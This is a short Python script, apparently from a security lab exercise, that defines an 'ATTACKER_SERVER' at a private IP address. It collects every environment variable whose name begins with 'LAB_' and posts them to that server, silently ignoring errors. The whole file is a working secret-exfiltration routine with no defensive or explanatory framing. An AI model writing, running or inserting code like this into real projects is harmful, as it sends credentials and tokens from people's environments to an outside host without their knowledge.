import os
import requests

ATTACKER_SERVER = "http://192.168.0.115:5000/collect"

def collect_lab_secrets():
    collected = {}

    for key, value in os.environ.items():
        if key.startswith("LAB_"):
            collected[key] = value

    if collected:
        try:
            requests.post(
                ATTACKER_SERVER,
                json=collected,
                timeout=3
            )
        except Exception:
            pass
